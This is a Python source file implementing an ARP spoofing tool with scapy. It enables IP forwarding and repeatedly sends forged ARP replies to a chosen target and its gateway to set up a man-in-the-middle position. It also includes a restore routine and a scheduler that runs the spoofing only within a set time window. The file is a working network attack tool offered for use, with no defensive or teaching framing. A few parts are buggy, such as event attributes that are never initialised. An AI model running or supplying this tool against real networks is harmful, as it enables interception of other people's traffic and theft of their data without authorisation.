import re
import time
import platform
from datetime import datetime, time as dt_time
from colorama import Fore
import concurrent.futures
import socket
from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import srp, send
import sys

class ARPSpoofer:
    def __init__(self, gateway, ip_address, schedule_enabled=False, start_time=None, end_time=None):
        self.gateway = gateway
        self.ip_address = ip_address
        self.schedule_enabled = schedule_enabled
        self.start_time = start_time
        self.end_time = end_time
        self.is_interrupted = False

    def is_valid(self):
        reg = r"^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"
        return re.match(reg, self.gateway) and re.match(reg, self.ip_address)

    @staticmethod
    def set_forwarding(value):
        if platform.system() in ["Linux", "Darwin"]:
            try:
                with open("/proc/sys/net/ipv4/ip_forward", "r+") as file:
                    return file.write(value)
            except FileNotFoundError:
                print("[!] File /proc/sys/net/ipv4/ip_forward not found. IP forwarding might not be supported on this system.")

    @staticmethod
    def get_mac(ip_address):
        packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address)
        try:
            answer, _ = srp(packet, timeout=5, verbose=False)
            if len(answer) > 0:
                return answer[0][1].hwsrc
        except Exception as e:
            print(f"[!] Error getting MAC Address: {e}")
        return None

    def spoof(self):
        target_mac = self.get_mac(self.ip_address)
        if not target_mac:
            log_and_exit(f"{Fore.RED}[!] Unable to get MAC Address..")
        # Starting forwarding
        self.set_forwarding("1")
        while True:
            try:
                # Check if the schedule is enabled and within the specified time
                if self.schedule_enabled and not self.is_within_schedule():
                    time.sleep(60)  # Check again in 1 minute
                    continue

                # Start spoofing process
                time.sleep(1)
                if not self.is_interrupted:
                    send(ARP(pdst=self.ip_address, hwdst=target_mac, psrc=self.gateway, op="is-at"), verbose=0)
                    send(ARP(pdst=self.gateway, hwdst=target_mac, psrc=self.ip_address, op="is-at"), verbose=0)
                    print(f"{Fore.YELLOW}[+] (ARP) Spoofing {self.ip_address}... [-] MAC Address: {target_mac}")
            except KeyboardInterrupt:
                self.is_interrupted = True
                self.unspoof()

    def unspoof(self):
        target_mac = self.get_mac(self.ip_address)
        if not target_mac:
            log_and_exit(f"{Fore.RED}[!] Unable to get MAC Address..")

        # Stop spoofing
        self.is_interrupted = True

        # Restore network
        arp = ARP(pdst=self.ip_address, hwdst=target_mac, psrc=self.gateway, hwsrc=self.get_mac(self.gateway))
        sec = 0
        while True:
            try:
                send(arp, verbose=1)
                sec = sec + 1
                if sec == 5:  # Send packets for X seconds
                    self.set_forwarding("0")
                    log_and_exit(f"\n{Fore.LIGHTGREEN_EX}[*] Network Restored!\n")
                time.sleep(1)
            except KeyboardInterrupt:
                print(f"\n{Fore.LIGHTCYAN_EX}[-] You are already restoring the network!")

    def is_within_schedule(self):
        current_time = datetime.now().time()
        return self.start_time <= current_time <= self.end_time

    def schedule(self):
        while not self.stop_event.is_set():
            # Check if the schedule is enabled and within the specified time
            if self.schedule_enabled and self.is_within_schedule():
                # If not already spoofing, start spoofing
                if not self.schedule_event.is_set():
                    print(f"{Fore.YELLOW}[+] Scheduled Spoofing Started")
                    self.spoof()
                    self.schedule_event.set()
            else:
                # If spoofing due to schedule but outside the schedule, stop spoofing
                if self.schedule_event.is_set():
                    print(f"{Fore.YELLOW}[+] Scheduled Spoofing Stopped")
                    self.unspoof()
                    self.schedule_event.clear()
            time.sleep(60)  # Check every minute

    def spoof_in_background(self):
        with concurrent.futures.ThreadPoolExecutor() as executor:
            executor.submit(self.spoof)
            executor.submit(self.schedule)

    def unspoof_in_background(self):
        with concurrent.futures.ThreadPoolExecutor() as executor:
            executor.submit(self.unspoof)

def log_and_exit(text):
    print(text)
    sys.exit(1)
